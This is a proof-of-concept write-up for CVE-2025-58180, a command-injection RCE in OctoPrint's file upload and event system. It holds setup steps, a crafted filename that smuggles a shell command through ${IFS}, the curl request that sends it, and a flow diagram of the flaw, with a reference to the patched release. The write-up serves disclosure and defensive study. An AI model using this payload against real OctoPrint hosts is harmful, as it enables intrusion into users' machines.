# CVE-2025-58180 RCE in OctoPrint via Unsanitized Filename in File Upload
In OctoPrint version &lt;=1.11.2, an attacker with file upload access (e.g., valid API key or session) can craft a malicious filename that bypasses sanitization and is later executed by OctoPrint’s event system, leading to remote code execution (RCE) on the host

---

## PoC: Steps to Recreate Vulnerability

### Step 1: Version Info
Downloaded latest stable release: **OctoPrint 1.11.2**

<img width="424" height="110" alt="image" src="https://github.com/user-attachments/assets/e7a16a14-29c0-4a15-958a-93417a94e346" />

---

### Step 2: Run OctoPrint
```bash
octoprint serve --port 5000 --debug
```

- Open [http://127.0.0.1:5000](http://127.0.0.1:5000) in browser.  
- Go through the initial wizard → create user with default settings (disabled: connectivity, anonymous, plugin).  
- Grab the API key from **Settings → API** → save for later.  
<img width="1626" height="973" alt="image" src="https://github.com/user-attachments/assets/52f45d63-aed0-41b8-bdf8-a60c958e92a0" />

Stop the OctoPrint service once above steps are done.

---

### Step 3: Configure Event Subscription
Following [OctoPrint events documentation](https://docs.octoprint.org/en/master/events/index.html):

Edit `~/.octoprint/config.yaml`:

```yaml
events:
  enabled: true
  subscriptions:
    - event: FileAdded
      type: system
      debug: true
      command: "{path}"
```
<img width="880" height="305" alt="image" src="https://github.com/user-attachments/assets/942c253c-70c7-495c-8d29-f575d366b21a" />

---

### Step 4: Create Sample G-code
Create `/tmp/gcode/ok.gcode`:

```gcode
; minimal gcode
G28
M105
```

Restart OctoPrint service.

---

### Step 5: Proof of Concept RCE

1. Export API key:
```bash
export API_KEY='<key previously gathered from webUI>'
```

2. Verify file doesn’t exist:
```bash
ls -la /tmp/test123
```

3. Craft malicious filename payload:  
`INJECT_NAME='octo;touch${IFS}/tmp/test123;#.gcode'`  

Explanation: `${IFS}` is the shell’s Internal Field Separator (usually a space). It bypasses sanitization when injected.

4. Send curl request:
```bash
curl -sS -X POST -H "X-Api-Key: $API_KEY" \
  -F "file=@/tmp/gcode/ok.gcode;filename=\"${INJECT_NAME}\"" \
  "http://127.0.0.1:5000/api/files/local"
```

5. Verify execution:
```bash
ls -la /tmp/test123
```
<img width="1170" height="511" alt="image" src="https://github.com/user-attachments/assets/19fc4c6a-f488-4ae1-9032-ab10b23cd227" />

If `/tmp/test123` exists, the injected command executed successfully → **RCE confirmed**.

---

## Explanation of Flow

```
[User upload with crafted filename]
        │
        ▼
server/api/files.py → accepts raw filename (metacharacters survive sanitize_name)
        │
        ▼
events.py (EventManager.fire "FileAdded") → payload {path} includes raw chars
        │
        ▼
system command subscriber → subprocess.check_call(..., shell=True)
        │
        ▼
[Injected shell metacharacters execute as OS commands]
```

---

## Summary

When a file is uploaded:

1. OctoPrint accepts the filename (with limited sanitization).  
2. It triggers a **FileAdded** event.  
3. If system commands are subscribed to this event, the raw filename (including `;`, `${IFS}`, etc.) is passed into a shell.  
4. This allows injected commands inside the filename to execute on the host.  

**Result:** Remote Code Execution (RCE) on the host system.
---

## References

- **CVE Assigned:(CVE-2025-58180)** [GHSA-49mj-x8jp-qvfc](https://github.com/OctoPrint/OctoPrint/security/advisories/GHSA-49mj-x8jp-qvfc)
- Patched version: 1.11.3
---
